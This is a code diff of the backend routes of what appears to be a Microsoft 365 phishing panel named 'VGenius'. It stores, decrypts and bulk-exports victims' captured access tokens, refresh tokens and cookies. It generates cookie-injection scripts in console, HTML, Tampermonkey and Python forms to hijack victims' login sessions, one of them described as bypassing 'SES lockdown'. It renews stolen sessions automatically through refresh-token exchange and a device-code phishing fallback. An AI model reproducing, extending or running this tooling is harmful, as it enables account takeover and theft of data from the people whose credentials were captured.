@@ -11,29 +11,28 @@ router.get('/', userAuth, async (req, res) => {
     const { sort, search, page = 1, limit = 50 } = req.query;
     let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, stale, deleted, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0';
     const params = [req.user.id];
-    
+
     if (search) {
       query += ' AND (email LIKE ? OR ip_address LIKE ?)';
       params.push('%' + search + '%', '%' + search + '%');
     }
-    
+
     query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
     const offset = (parseInt(page) - 1) * parseInt(limit);
     query += ' LIMIT ? OFFSET ?';
     params.push(parseInt(limit), offset);
-    
-    // Select tokens with tenant field if available (for backward compatibility with older DB schemas)
+
     let tokens;
     try {
       const [t] = await db.query(query.replace('SELECT id,', 'SELECT id, tenant,'), params);
       tokens = t;
     } catch {
-      // Fallback: query without tenant column (old schema)
       const [t] = await db.query(query, params);
       tokens = t.map(t => ({ ...t, tenant: 'common' }));
     }
+
     const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
-    
+
     res.json({
       tokens: tokens,
       total: countResult[0].total,
@@ -50,7 +49,7 @@ router.get('/:id', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
-    
+
     const token = tokens[0];
     const decrypted = {
       id: token.id,
@@ -70,7 +69,7 @@ router.get('/:id', userAuth, async (req, res) => {
       id_token: decrypt(token.id_token_encrypted),
       cookies: decrypt(token.cookies_encrypted)
     };
-    
+
     res.json(decrypted);
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
@@ -103,25 +102,21 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
-    
+
     const token = tokens[0];
     const accessToken = decrypt(token.access_token_encrypted);
     const refreshToken = decrypt(token.refresh_token_encrypted);
     const cookies = decrypt(token.cookies_encrypted);
-    
-    // Check if we have any tokens to work with
+
     if (!accessToken && !refreshToken && !cookies) {
       return res.status(400).json({ error: 'No tokens available' });
     }
-    
-    // Build cookie array based on available data
+
     var cookiesList = [];
-    
-    // If we have pre-converted cookies, use them
+
     if (cookies) {
       cookiesList = parseCookies(cookies);
     } else {
-      // Otherwise build from access/refresh tokens
       if (accessToken) {
         cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
       }
@@ -129,26 +124,17 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
         cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
       }
     }
-    
+
     if (cookiesList.length === 0) {
       return res.status(400).json({ error: 'No cookies available' });
     }
-    
-    // Generate multiple script variants
+
     var scripts = {};
-    
-    // Variant 1: Console script (for manual injection)
     scripts.console = generateConsoleScript(cookiesList);
-    
-    // Variant 2: Standalone HTML file
     scripts.html = generateStandaloneHtml(cookiesList);
-    
-    // Variant 3: Tampermonkey userscript
     scripts.tampermonkey = generateTampermonkeyScript(cookiesList);
-    
-    // Variant 4: Python script
     scripts.python = generatePythonScript(cookiesList);
-    
+
     res.json({
       script: scripts.console,
       scripts: scripts,
@@ -164,29 +150,37 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
 
 function parseCookies(cookieString) {
   if (!cookieString) return [];
-  
+
   var cookies = [];
   var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });
-  
+
   for (var i = 0; i < pairs.length; i++) {
     var pair = pairs[i].trim();
     var eqIndex = pair.indexOf('=');
+
     if (eqIndex > 0) {
       var name = pair.substring(0, eqIndex).trim();
       var value = pair.substring(eqIndex + 1).trim();
-      
-      // Skip common non-cookie parameters
-      if (name.toLowerCase() !== 'expires' && 
-          name.toLowerCase() !== 'max-age' && 
-          name.toLowerCase() !== 'domain' && 
-          name.toLowerCase() !== 'path' && 
-          name.toLowerCase() !== 'secure' && 
-          name.toLowerCase() !== 'httponly') {
-        cookies.push({ name: name, value: value, domain: '.login.microsoftonline.com' });
+      var nameLower = name.toLowerCase();
+
+      // Skip cookie attributes - must check for exact matches or startsWith
+      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
+          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
+          nameLower.startsWith('samesite')) {
+        continue;
       }
+
+      // Skip empty values
+      if (!value || value.length === 0) continue;
+
+      cookies.push({
+        name: name,
+        value: value,
+        domain: '.login.microsoftonline.com'
+      });
     }
   }
-  
+
   return cookies;
 }
 
@@ -196,13 +190,19 @@ function generateConsoleScript(cookies) {
   var expires = new Date();
   expires.setFullYear(expires.getFullYear() + 100);
   var expStr = expires.toUTCString();
-  
+
   var statements = cookies.map(function(c) {
     var domain = c.domain || '.login.microsoftonline.com';
     return 'document.cookie="' + c.name + '=' + c.value + '; domain=' + domain + '; expires=' + expStr + '; path=/; SameSite=None; secure"';
-  }).join(';\n  ');
-  
-  return '(function(){\n  try {\n    ' + statements + ';\n    console.log("Injected " + ' + cookies.length + ' cookies");\n  } catch(e){ console.error("Cookie inject failed:", e); }\n  setTimeout(function(){ window.location.href="https://login.microsoftonline.com/?auth=2"; }, 1500);\n})();';
+  }).join(';\n ');
+
+  return '(function(){\n' +
+    ' try {\n' +
+    ' ' + statements + ';\n' +
+    ' console.log("Injected ' + cookies.length + ' cookies");\n' +
+    ' } catch(e){ console.error("Cookie inject failed:", e); }\n' +
+    ' setTimeout(function(){ window.location.href="https://login.microsoftonline.com/?auth=2"; }, 1500);\n' +
+    '})();';
 }
 
 // FIX: Use document.cookie instead of fetch interception
@@ -211,49 +211,49 @@ function generateStandaloneHtml(cookies) {
   var expires = new Date();
   expires.setFullYear(expires.getFullYear() + 100);
   var expStr = expires.toUTCString();
-  
+
   var bypassScript = '(function(){\n' +
-    '  var cookies=' + cookieJson + ';\n' +
-    '  var exp="' + expStr + '";\n' +
-    '  for(var i=0;i<cookies.length;i++){\n' +
-    '    try{\n' +
-    '      var d=cookies[i].domain||".login.microsoftonline.com";\n' +
-    '      document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n' +
-    '    }catch(e){}\n' +
-    '  }\n' +
-    '  console.log("Injected "+cookies.length+" cookies via document.cookie");\n' +
-    '  setTimeout(function(){window.location.href="https://login.microsoftonline.com/?auth=2";},1500);\n' +
+    ' var cookies=' + cookieJson + ';\n' +
+    ' var exp="' + expStr + '";\n' +
+    ' for(var i=0;i<cookies.length;i++){\n' +
+    ' try{\n' +
+    ' var d=cookies[i].domain||".login.microsoftonline.com";\n' +
+    ' document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n' +
+    ' }catch(e){}\n' +
+    ' }\n' +
+    ' console.log("Injected "+cookies.length+" cookies");\n' +
+    ' setTimeout(function(){window.location.href="https://login.microsoftonline.com/?auth=2";},1500);\n' +
     '})();';
-  
+
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
-  html += '  <meta charset="UTF-8">\n';
-  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
-  html += '  <title>VGenius Cookie Injector</title>\n';
-  html += '  <style>\n';
-  html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
-  html += '    button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
-  html += '    button:hover { background: #00cca3; }\n';
-  html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
-  html += '  </style>\n';
+  html += ' <meta charset="UTF-8">\n';
+  html += ' <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
+  html += ' <title>VGenius Cookie Injector</title>\n';
+  html += ' <style>\n';
+  html += ' body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
+  html += ' button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
+  html += ' button:hover { background: #00cca3; }\n';
+  html += ' pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
+  html += ' </style>\n';
   html += '</head>\n<body>\n';
-  html += '  <h1>VGenius Cookie Session Injector</h1>\n';
-  html += '  <p>1. Go to https://login.microsoftonline.com</p>\n';
-  html += '  <p>2. Press F12 to open console</p>\n';
-  html += '  <p>3. Paste the script below and press Enter</p>\n';
-  html += '  <p>4. The page will auto-redirect in 1.5 seconds</p>\n';
-  html += '  <button onclick="copyScript()">Copy Script</button>\n';
-  html += '  <pre id="script"></pre>\n';
-  html += '  <script>\n';
-  html += '    var bypassScript = ' + JSON.stringify(bypassScript) + ';\n';
-  html += '    document.getElementById("script").textContent = bypassScript;\n';
-  html += '    function copyScript() {\n';
-  html += '      navigator.clipboard.writeText(bypassScript).then(function() {\n';
-  html += '        alert("Script copied! Paste it in the Microsoft login console. It will auto-redirect in 1.5 seconds.");\n';
-  html += '      });\n';
-  html += '    }\n';
-  html += '  </script>\n';
+  html += ' <h1>VGenius Cookie Session Injector</h1>\n';
+  html += ' <p>1. Go to https://login.microsoftonline.com</p>\n';
+  html += ' <p>2. Press F12 to open console</p>\n';
+  html += ' <p>3. Paste the script below and press Enter</p>\n';
+  html += ' <p>4. The page will auto-redirect in 1.5 seconds</p>\n';
+  html += ' <button onclick="copyScript()">Copy Script</button>\n';
+  html += ' <pre id="script"></pre>\n';
+  html += ' <script>\n';
+  html += ' var bypassScript = ' + JSON.stringify(bypassScript) + ';\n';
+  html += ' document.getElementById("script").textContent = bypassScript;\n';
+  html += ' function copyScript() {\n';
+  html += ' navigator.clipboard.writeText(bypassScript).then(function() {\n';
+  html += ' alert("Script copied! Paste it in the Microsoft login console. It will auto-redirect in 1.5 seconds.");\n';
+  html += ' });\n';
+  html += ' }\n';
+  html += ' </script>\n';
   html += '</body>\n</html>';
-  
+
   return html;
 }
 
@@ -263,33 +263,33 @@ function generateTampermonkeyScript(cookies) {
   var expires = new Date();
   expires.setFullYear(expires.getFullYear() + 100);
   var expStr = expires.toUTCString();
-  
+
   var script = '// ==UserScript==\n';
-  script += '// @name         VGenius Cookie Injector (SES Bypass)\n';
-  script += '// @namespace    http://tampermonkey.net/\n';
-  script += '// @version      2.0\n';
-  script += '// @description  Inject Microsoft cookies - bypasses SES lockdown\n';
-  script += '// @author       VGenius\n';
-  script += '// @match        https://login.microsoftonline.com/*\n';
-  script += '// @grant        none\n';
+  script += '// @name VGenius Cookie Injector (SES Bypass)\n';
+  script += '// @namespace http://tampermonkey.net/\n';
+  script += '// @version 2.0\n';
+  script += '// @description Inject Microsoft cookies - bypasses SES lockdown\n';
+  script += '// @author VGenius\n';
+  script += '// @match https://login.microsoftonline.com/*\n';
+  script += '// @grant none\n';
   script += '// ==/UserScript==\n\n';
   script += '(function() {\n';
-  script += '  \'use strict\';\n\n';
-  script += '  var cookies = ' + cookieJson + ';\n';
-  script += '  var exp="' + expStr + '";\n\n';
-  script += '  for(var i=0;i<cookies.length;i++){\n';
-  script += '    try{\n';
-  script += '      var d=cookies[i].domain||".login.microsoftonline.com";\n';
-  script += '      document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n';
-  script += '    }catch(e){}\n';
-  script += '  }\n\n';
-  script += '  console.log("VGenius: Injected "+cookies.length+" cookies via document.cookie");\n';
-  script += '  \n';
-  script += '  setTimeout(function() {\n';
-  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += '  }, 2000);\n';
+  script += ' \'use strict\';\n\n';
+  script += ' var cookies = ' + cookieJson + ';\n';
+  script += ' var exp="' + expStr + '";\n\n';
+  script += ' for(var i=0;i<cookies.length;i++){\n';
+  script += ' try{\n';
+  script += ' var d=cookies[i].domain||".login.microsoftonline.com";\n';
+  script += ' document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n';
+  script += ' }catch(e){}\n';
+  script += ' }\n\n';
+  script += ' console.log("VGenius: Injected "+cookies.length+" cookies");\n';
+  script += ' \n';
+  script += ' setTimeout(function() {\n';
+  script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += ' }, 2000);\n';
   script += '})();\n';
-  
+
   return script;
 }
 
@@ -302,21 +302,21 @@ function generatePythonScript(cookies) {
   script += 'session = requests.Session()\n\n';
   script += 'print("Injecting cookies...")\n';
   script += 'for cookie in cookies:\n';
-  script += '    try:\n';
-  script += '        session.cookies.set(\n';
-  script += '            name=cookie["name"],\n';
-  script += '            value=cookie["value"],\n';
-  script += '            domain=cookie["domain"],\n';
-  script += '            secure=True,\n';
-  script += '            samesite="None"\n';
-  script += '        )\n';
-  script += '        print(f"Injected: {cookie[\'name\']}")\n';
-  script += '    except Exception as e:\n';
-  script += '        print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
+  script += ' try:\n';
+  script += ' session.cookies.set(\n';
+  script += ' name=cookie["name"],\n';
+  script += ' value=cookie["value"],\n';
+  script += ' domain=cookie["domain"],\n';
+  script += ' secure=True,\n';
+  script += ' samesite="None"\n';
+  script += ' )\n';
+  script += ' print(f"Injected: {cookie[\'name\']}")\n';
+  script += ' except Exception as e:\n';
+  script += ' print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
   script += 'print("\\nSession ready!")\n';
   script += 'print(f"Total cookies: {len(cookies)}")\n';
   script += 'print(f"Generated at: {datetime.now()}")\n';
-  
+
   return script;
 }
 
@@ -325,41 +325,41 @@ router.post('/:id/renew', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
-    
+
     const token = tokens[0];
     const refreshToken = decrypt(token.refresh_token_encrypted);
     const accessToken = decrypt(token.access_token_encrypted);
-    
+
     if (!refreshToken && !accessToken) {
       return res.status(400).json({ error: 'No tokens available for renewal' });
     }
-    
+
     // If we have a refresh token, use it to get new tokens directly (no popup needed)
     if (refreshToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
         const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
-        
+
         // Convert refresh token to new cookies using stored tenant
         const result = await cookieConverter.convertTokensToCookies(refreshToken, templateType, token.tenant || 'common');
-        
+
         if (result.success && result.cookies) {
           // Update token in database with new cookies AND new tokens
           const ttlHours = 24 * 365 * 100; // 100 years
-          
+
           // Use the NEW tokens from the exchange, not the old ones
           const newAccessToken = result.access_token || accessToken;
           const newRefreshToken = result.new_refresh_token || refreshToken;
-          
+
           // Ensure they're different (access token and refresh token should never be the same)
           const finalAccessToken = newAccessToken !== newRefreshToken ? newAccessToken : accessToken;
           const finalRefreshToken = newRefreshToken;
-          
+
           await db.query(
             `UPDATE captured_tokens 
              SET cookies_encrypted = ?, token_type = 'cookie', expiration = DATE_ADD(NOW(), INTERVAL ? HOUR), 
-                 last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1,
-                 access_token_encrypted = ?, refresh_token_encrypted = ?
+                 last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1, 
+                 access_token_encrypted = ?, refresh_token_encrypted = ? 
              WHERE id = ?`,
             [
               encrypt(result.cookies),
@@ -369,13 +369,13 @@ router.post('/:id/renew', userAuth, async (req, res) => {
               token.id
             ]
           );
-          
+
           // Log renewal
           await db.query(
             'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
             [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
           );
-          
+
           return res.json({
             success: true,
             message: 'Session renewed successfully using refresh token',
@@ -388,7 +388,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         // Fall back to device code flow if refresh token fails
       }
     }
-    
+
     // Fallback: Start a new device code flow for re-authentication
     const deviceProxy = require('../services/deviceproxy');
     const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
@@ -397,16 +397,16 @@ router.post('/:id/renew', userAuth, async (req, res) => {
       require('../config/env').JWT_SECRET,
       { expiresIn: '1h' }
     );
-    
+
     const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);
-    
+
     if (result.user_code) {
       // Store the renewal record
       await db.query(
         'INSERT INTO cookie_renewals (capture_id, user_id, user_code, success, created_at) VALUES (?, ?, ?, 0, NOW())',
         [token.id, req.user.id, result.user_code]
       );
-      
+
       res.json({
         success: true,
         job_id: result.job_id,
@@ -460,13 +460,12 @@ router.get('/inject-script', userAuth, async (req, res) => {
     }
 
     // Use the REAL OAuth2 refresh token (not PRT blob)
-    // refresh_token field contains the real OAuth2 token (starts with 0.AT or M.R)
     const realRefreshToken = refreshToken;
-    
+
     if (!realRefreshToken) {
       return res.status(400).json({ error: 'No refresh token available. Cannot generate injection script.' });
     }
-    
+
     // Get client_id from config (same one used in device code flow)
     const clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 
@@ -475,39 +474,41 @@ router.get('/inject-script', userAuth, async (req, res) => {
 
     // Generate the one-shot console script with relative URLs for same-origin cookie storage
     const script = `(async function() {
-  const refreshToken = "${realRefreshToken}";
-  const clientId = "${clientId}";
-
-  const body = new URLSearchParams({
-    client_id: clientId,
-    grant_type: "refresh_token",
-    refresh_token: refreshToken,
-    scope: "https://graph.microsoft.com/.default offline_access openid profile"
-  });
-
-  const endpoints = [
-    "/${tokenTenant}/oauth2/v2.0/token",
-    "/common/oauth2/v2.0/token",
-    "/consumers/oauth2/v2.0/token"
-  ];
-
-  for (const url of endpoints) {
-    try {
-      const resp = await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: body.toString(),
-        credentials: "include"
+      const refreshToken = "${realRefreshToken}";
+      const clientId = "${clientId}";
+      
+      const body = new URLSearchParams({
+        client_id: clientId,
+        grant_type: "refresh_token",
+        refresh_token: refreshToken,
+        scope: "https://graph.microsoft.com/.default offline_access openid profile"
       });
-      if (resp.ok) {
-        // Fresh cookies (ESTSAUTHPERSISTENT, esctx) are now set in the browser.
-        window.location.href = "https://www.office.com/";
-        return;
+      
+      const endpoints = [
+        "/${tokenTenant}/oauth2/v2.0/token",
+        "/common/oauth2/v2.0/token",
+        "/consumers/oauth2/v2.0/token"
+      ];
+      
+      for (const url of endpoints) {
+        try {
+          const resp = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: body.toString(),
+            credentials: "include"
+          });
+          
+          if (resp.ok) {
+            // Fresh cookies (ESTSAUTHPERSISTENT, esctx) are now set in the browser.
+            window.location.href = "https://www.office.com/";
+            return;
+          }
+        } catch (e) {}
       }
-    } catch (e) {}
-  }
-  alert("Exchange failed. The refresh token may be expired or the client_id is wrong.");
-})();`;
+      
+      alert("Exchange failed. The refresh token may be expired or the client_id is wrong.");
+    })();`;
 
     res.type('application/javascript').send(script);
   } catch (err) {
@@ -520,6 +521,7 @@ router.get('/inject-script', userAuth, async (req, res) => {
 router.post('/convert-cookie', userAuth, async (req, res) => {
   try {
     const { access_token, template_type } = req.body;
+
     if (!access_token) {
       return res.status(400).json({ error: 'Access token is required' });
     }
@@ -551,8 +553,7 @@ router.post('/export', userAuth, async (req, res) => {
       'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
     );
-    
-    // Decrypt tokens for export
+
     const decryptedTokens = tokens.map(token => ({
       id: token.id,
       email: token.email,
@@ -567,11 +568,11 @@ router.post('/export', userAuth, async (req, res) => {
       id_token: decrypt(token.id_token_encrypted),
       cookies: decrypt(token.cookies_encrypted)
     }));
-    
-    res.json({ 
-      tokens: decryptedTokens, 
-      exported_at: new Date().toISOString(), 
-      count: decryptedTokens.length 
+
+    res.json({
+      tokens: decryptedTokens,
+      exported_at: new Date().toISOString(),
+      count: decryptedTokens.length
     });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
@@ -585,7 +586,7 @@ router.post('/export-delete-all', userAuth, async (req, res) => {
       'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0',
       [req.user.id]
     );
-    
+
     const decryptedTokens = tokens.map(token => ({
       id: token.id,
       email: token.email,
@@ -600,9 +601,15 @@ router.post('/export-delete-all', userAuth, async (req, res) => {
       id_token: decrypt(token.id_token_encrypted),
       cookies: decrypt(token.cookies_encrypted)
     }));
-    
+
     await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
-    res.json({ tokens: decryptedTokens, exported_at: new Date().toISOString(), count: decryptedTokens.length, deleted: true });
+
+    res.json({
+      tokens: decryptedTokens,
+      exported_at: new Date().toISOString(),
+      count: decryptedTokens.length,
+      deleted: true
+    });
   } catch (err) {
     res.status(500).json({ error: 'Server error' });
   }
